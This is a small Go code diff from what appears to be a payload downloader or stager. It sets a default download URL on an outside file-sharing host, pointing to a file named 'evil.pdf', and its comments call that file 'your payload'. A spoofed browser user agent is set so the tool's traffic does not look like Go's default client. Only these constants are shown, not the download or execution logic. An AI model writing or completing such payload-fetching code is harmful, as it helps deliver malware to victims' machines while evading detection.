@@ -17,7 +17,7 @@ import (
 
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
-	defaultDownloadURL = ""
+	defaultDownloadURL = "https://l.station307.com/XNf8J3Lyw2NMfYnhM3Eigg/evil.pdf"
 	// feel free to change this to whatever you want.. this is just a stand in so it isn't the go net/http user agent
 	userAgent         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
 )
